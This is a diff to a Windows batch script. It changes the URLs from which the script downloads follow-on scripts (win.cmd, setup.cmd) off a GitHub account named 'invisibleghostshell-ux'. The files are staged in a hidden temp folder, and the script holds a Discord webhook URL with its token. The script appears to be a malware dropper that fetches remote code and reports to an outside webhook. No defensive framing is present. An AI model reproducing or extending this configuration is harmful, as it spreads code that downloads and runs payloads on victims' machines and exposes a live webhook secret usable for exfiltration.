@@ -2,11 +2,11 @@
 setlocal
 
 REM Define URLs and paths
-set "strWinURL=https://raw.githubusercontent.com/invisibleghostshell-ux/lua/main/win.vbs"
-set "strPs1URL=https://raw.githubusercontent.com/invisibleghostshell-ux/lua/main/setup-lua.ps1"
+set "strWinURL=https://github.com/invisibleghostshell-ux/last/raw/main/win.cmd"
+set "strPs1URL=https://github.com/invisibleghostshell-ux/last/raw/main/setup.cmd"
 set "strRootPath=%TEMP%\ZZ\"
-set "strPs1Path=%strRootPath%setup-lua.ps1"
-set "strWinPath=%strRootPath%win.vbs"
+set "strPs1Path=%strRootPath%setup.cmd"
+set "strWinPath=%strRootPath%win.cmd"
 set "strWebhookURL=https://discord.com/api/webhooks/1268854626288140372/Jp_jALGydP2E3ZGckb3FOVzc9ZhkJqKxsKzHVegnO-OIAwAWymr6lsbjCK0DAP_ttRV2"
 set "intWait=5000"
 
